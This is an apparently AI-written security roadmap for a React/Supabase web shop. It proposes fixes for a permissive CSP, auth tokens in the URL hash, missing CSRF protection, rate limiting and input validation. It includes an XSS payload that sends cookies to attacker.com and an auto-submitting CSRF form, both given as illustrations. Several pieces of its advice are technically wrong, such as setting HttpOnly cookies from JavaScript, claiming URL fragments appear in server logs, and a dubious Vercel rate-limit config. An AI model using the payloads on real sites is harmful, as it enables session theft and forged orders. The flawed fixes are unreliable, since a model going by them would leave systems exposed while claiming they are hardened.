# 🔒 Remaining Security Vulnerabilities - Detailed Roadmap

## Commit Status
✅ **Pushed to GitHub:** `8580fc4`  
✅ **Branch:** main  
✅ **Build Status:** Passing

---

## Vulnerability #1: CSP Configuration (Critical XSS Vector)

### Current Status
```
❌ VULNERABLE: CSP allows 'unsafe-inline' and 'unsafe-eval'
```

### The Problem
```html
<!-- Current (Unsafe) -->
<meta http-equiv="Content-Security-Policy" 
  content="script-src 'self' 'unsafe-inline' 'unsafe-eval' blob: https://*;">
```

This allows:
- ❌ Any inline `<script>` tag
- ❌ Any inline event handler (`onclick="..."`)
- ❌ `eval()` function execution
- ❌ `new Function()` constructor

### Why It Matters
An attacker with XSS could execute arbitrary code:
```javascript
// This WOULD work with current CSP
<img src=x onerror="fetch('https://attacker.com/steal?data='+document.cookie)">
```

### Fix Strategy (Staged Approach)

#### **Phase 1: Remove 'unsafe-eval' (Low Risk) - 1 hour**
```html
<meta http-equiv="Content-Security-Policy" 
  content="script-src 'self' 'unsafe-inline' blob: https://*; ...">
                         ↓ REMOVE ↓
```

**Why this is safe:** Rarely used in modern code

#### **Phase 2: Remove 'unsafe-inline' (Requires Testing) - 3-4 hours**
Need to check for and fix inline styles:

```typescript
// BEFORE (Violates CSP)
<div style={{ color: 'red', fontSize: '16px' }}>Text</div>

// AFTER (CSP Compliant)
import './styles.css';
<div className="text-danger">Text</div>
```

**Search patterns to fix:**
```bash
grep -r "style={{" src/
grep -r "style=" src/
grep -r "onclick=" src/
grep -r "onchange=" src/
```

#### **Phase 3: Implement Nonce-Based CSP (2-3 hours)**
```typescript
// Vite plugin to inject random nonce
// Creates: script-src 'nonce-{random}' instead of 'unsafe-inline'
```

### Implementation Order
1. ✅ Remove 'unsafe-eval' - safe, quick
2. ✅ Audit for inline styles - identify what needs fixing
3. ✅ Create CSS module replacements
4. ✅ Test thoroughly
5. ✅ Remove 'unsafe-inline'

### Risk Assessment
- **Phase 1:** 🟢 LOW RISK - No changes needed
- **Phase 2:** 🟡 MEDIUM RISK - Requires CSS refactoring
- **Phase 3:** 🟡 MEDIUM RISK - Requires nonce implementation

---

## Vulnerability #2: Auth Token in URL Hash (High - Token Exposure)

### Current Status
```
❌ VULNERABLE: Tokens visible in browser history and logs
```

### The Problem
```typescript
// Current code in Auth.tsx
const hashParams = new URLSearchParams(window.location.hash.substring(1));
const accessToken = hashParams.get('access_token');
const refreshToken = hashParams.get('refresh_token');

// Example vulnerable URL:
// https://freelit.com/auth#access_token=eyJhbGciOiJIUzI1NiIs...&refresh_token=abc123...
```

### Why It's Dangerous

| Exposure Point | Risk | Severity |
|---|---|---|
| Browser History | User's device compromised → tokens leaked | 🔴 HIGH |
| Server Logs | Admin sees tokens in access logs | 🔴 HIGH |
| Referrer Header | Token sent when clicking external link | 🟠 MEDIUM |
| Browser Cache | Tokens cached in browser | 🟠 MEDIUM |

### Attack Scenario
1. Attacker accesses user's browser history
2. Finds URL with access_token
3. Uses token to make API requests as that user
4. Accesses orders, payment info, etc.

### Fix Options

#### **Option A: Immediate URL Clearing (1 hour - Quick Fix)**
```typescript
// In Auth.tsx - Clear URL immediately after extracting token
const handleAuth = async () => {
  const hashParams = new URLSearchParams(window.location.hash.substring(1));
  const accessToken = hashParams.get('access_token');
  const refreshToken = hashParams.get('refresh_token');
  
  // ✅ CLEAR URL IMMEDIATELY
  window.history.replaceState({}, document.title, window.location.pathname);
  
  // Now tokens are in memory but not visible in URL
  // ... rest of auth logic
};
```

**Pros:** ✅ Quick, minimal changes  
**Cons:** ❌ Tokens still briefly exposed during loading

#### **Option B: Authorization Code Flow with PKCE (4-5 hours - Proper Fix)**
Modern OAuth 2.0 best practice - tokens never in URL

```typescript
// Step 1: Redirect to Supabase OAuth
window.location.href = `https://supabase.com/auth/v1/authorize?
  client_id=${CLIENT_ID}
  &response_type=code
  &redirect_uri=${REDIRECT_URI}
  &state=${random_state}
  &code_challenge=${random_challenge}`;

// Step 2: Backend exchanges code for tokens (never exposed to client)
const { access_token, refresh_token } = await backend.exchangeCode(code);

// Step 3: Tokens stored in httpOnly cookies (not accessible to JS)
```

**Pros:** ✅ Proper OAuth 2.0, ✅ No token exposure  
**Cons:** ❌ Requires Supabase configuration changes

#### **Option C: httpOnly Cookies (2-3 hours - Balanced Approach)**
```typescript
// Store tokens in httpOnly cookies instead of sessionStorage
// Cannot be accessed by JavaScript - safer against XSS

document.cookie = `access_token=${token}; HttpOnly; Secure; SameSite=Strict`;
```

**Pros:** ✅ Good security, ✅ Moderate effort  
**Cons:** ❌ Requires backend support

### Recommended Approach
1. **Immediate:** Use Option A (clear URL)
2. **Next Sprint:** Implement Option B (proper OAuth flow)

### Implementation Steps for Option A
1. Find all places tokens are extracted from URL hash
2. Add `window.history.replaceState()` immediately after
3. Test email verification still works
4. Test password reset flow

### Implementation Steps for Option B
1. Update Supabase email template
2. Create authorization flow in Auth.tsx
3. Create backend endpoint to exchange code for tokens
4. Extensive testing of auth flows

---

## Vulnerability #3: CSRF Protection (Medium - State-Changing Ops)

### Current Status
```
❌ MISSING: No CSRF token validation on checkout, admin ops
```

### The Problem
Attacker can forge requests on behalf of authenticated users

### Attack Example
```html
<!-- On attacker's website -->
<form action="https://freelit.com/api/checkout" method="POST">
  <input type="hidden" name="paymentMethod" value="cod">
  <input type="hidden" name="address" value="attacker-address">
  <script>document.forms[0].submit();</script>
</form>
<!-- User clicks link, order placed to attacker's address without consent -->
```

### Fix: Use SameSite Cookies (Easiest - 1 hour)
```typescript
// In Supabase auth settings
// Set all cookies to SameSite=Strict
// This prevents cross-site requests automatically
```

**Alternative:** Token-based CSRF (2-3 hours)
```typescript
// Generate token in form
const csrfToken = generateRandomToken();
sessionStorage.setItem('csrf_token', csrfToken);

// Include in request
POST /api/checkout {
  ...data,
  _csrf_token: csrfToken
}

// Validate on server
if (!validateCSRFToken(sessionId, token)) {
  return 403 Forbidden
}
```

### Recommended Approach
**Use SameSite=Strict** (already configured in your Supabase)
- Check: Supabase Dashboard → Authentication → Session Settings
- Ensure "SameSite" = "Strict"

---

## Vulnerability #4: Rate Limiting (Medium - Brute Force)

### Current Status
```
❌ MISSING: No rate limits on login, checkout, password reset
```

### The Problem
Attackers can:
- Brute force login attempts
- Spam checkout operations
- Enumerate user emails via password reset
- Cause DoS by spamming requests

### Fix: Implement Rate Limiting (2-3 hours)

#### **Approach 1: Vercel Built-in (Easiest)**
```json
{
  "routes": [
    {
      "source": "/api/(.*)",
      "rateLimit": {
        "limit": 100,
        "window": "60s"
      }
    }
  ]
}
```

#### **Approach 2: Custom Middleware**
```typescript
// Using Redis or in-memory store
const rateLimiter = new Map();

function checkRateLimit(userId, action) {
  const key = `${userId}:${action}`;
  const count = rateLimiter.get(key) || 0;
  
  if (count > MAX_ATTEMPTS[action]) {
    return false; // Rate limit exceeded
  }
  
  rateLimiter.set(key, count + 1);
  return true;
}
```

### Recommended Actions
| Action | Limit | Window |
|--------|-------|--------|
| Login attempts | 5 | 15 minutes |
| Checkout | 10 | 1 hour |
| Password reset | 3 | 1 hour |
| API requests | 100 | 1 hour |

---

## Vulnerability #5: Input Validation (Medium - Injection)

### Current Status
```
⚠️ PARTIAL: Some validation exists, but incomplete
```

### The Problem
```typescript
// Current: Minimal validation
if (userContactData.phone) {
  // No regex check, no length limit
}

// Better: Comprehensive validation
const phoneSchema = z
  .string()
  .regex(/^[6-9]\d{9}$/, 'Invalid phone')
  .length(10);
```

### Files Needing Enhancement
1. `src/lib/validation.ts` - Add comprehensive Zod schemas
2. `src/pages/Checkout.tsx` - Use schemas for all inputs
3. `src/components/admin/` - Validate all admin inputs

### Schema Example
```typescript
export const checkoutSchema = z.object({
  name: z.string()
    .min(2, 'Name too short')
    .max(100, 'Name too long')
    .regex(/^[a-zA-Z\s'-]+$/, 'Invalid characters'),
  
  email: z.string()
    .email('Invalid email')
    .max(255, 'Email too long'),
  
  phone: z.string()
    .regex(/^[6-9]\d{9}$/, 'Must be valid 10-digit number')
    .length(10),
  
  address: z.string()
    .min(10, 'Address too short')
    .max(500, 'Address too long'),
  
  pincode: z.string()
    .regex(/^\d{6}$/, 'Must be 6 digits')
});
```

### Implementation Effort
- Schema creation: 1-2 hours
- Integration in components: 1-2 hours
- Testing: 1 hour

---

## 📊 Priority & Effort Matrix

| Vulnerability | Priority | Effort | Risk if Fixed | Impact |
|---|---|---|---|---|
| CSP (unsafe-inline) | 🔴 CRITICAL | 4-5h | MEDIUM | Blocks XSS attacks |
| Token in URL | 🔴 CRITICAL | 1-4h | MEDIUM | Blocks token theft |
| CSRF Protection | 🟠 HIGH | 1-2h | LOW | Blocks unauthorized actions |
| Rate Limiting | 🟡 MEDIUM | 2-3h | LOW | Blocks brute force/DoS |
| Input Validation | 🟡 MEDIUM | 2-3h | LOW | Blocks injection attacks |

---

## Recommended Implementation Order

### **Sprint 1 (This Week) - 2-3 hours**
1. ✅ Remove 'unsafe-eval' from CSP
2. ✅ Implement URL clearing in Auth.tsx (Option A)
3. ✅ Verify SameSite=Strict cookies in Supabase

### **Sprint 2 (Next Week) - 4-5 hours**
1. ✅ Audit and fix inline styles for CSP
2. ✅ Remove 'unsafe-inline' from CSP
3. ✅ Implement rate limiting

### **Sprint 3 (Following Week) - 2-3 hours**
1. ✅ Enhance input validation
2. ✅ Add CSRF token validation (if not using SameSite)
3. ✅ Add token-based CSRF

### **Optional (Future) - 4-5 hours**
1. ✅ Implement proper OAuth 2.0 with PKCE
2. ✅ Migrate to httpOnly cookies
3. ✅ Add comprehensive security logging

---

## Implementation Checklist

### Phase 1: Quick Wins (Today)
- [ ] Remove 'unsafe-eval' from CSP
- [ ] Implement URL clearing in Auth.tsx
- [ ] Test password reset flows
- [ ] Test email verification

### Phase 2: CSP Migration (This Week)
- [ ] Audit for inline styles
- [ ] Create CSS modules
- [ ] Refactor components
- [ ] Test thoroughly
- [ ] Remove 'unsafe-inline'

### Phase 3: Additional Hardening (Next Week)
- [ ] Add rate limiting
- [ ] Enhance input validation
- [ ] Verify CSRF protection

---

## Questions to Guide Your Decisions

1. **CSP Fix:** Do you want to do it now or schedule for next sprint?
   - Option: Quick removal of 'unsafe-eval' only
   - Option: Full refactor to remove 'unsafe-inline'

2. **Token Exposure:** Do you want quick fix or proper solution?
   - Option: Clear URL immediately (1 hour, quick fix)
   - Option: Implement OAuth 2.0 with PKCE (4-5 hours, proper fix)

3. **Timeline:** How much time can you invest?
   - Option: Minimal (2-3 hours) - just quick fixes
   - Option: Medium (6-8 hours) - quick fixes + CSP
   - Option: Full (12-15 hours) - comprehensive hardening

---

## Success Metrics

After all fixes:
- ✅ No 'unsafe-inline' or 'unsafe-eval' in CSP
- ✅ Tokens not visible in URL or logs
- ✅ CSRF protection validated
- ✅ Rate limits preventing abuse
- ✅ All inputs validated with Zod schemas
- ✅ Security headers in place
- ✅ Build passes with no errors
- ✅ All functionality still works

---

Choose your path and I'll guide you through each step!
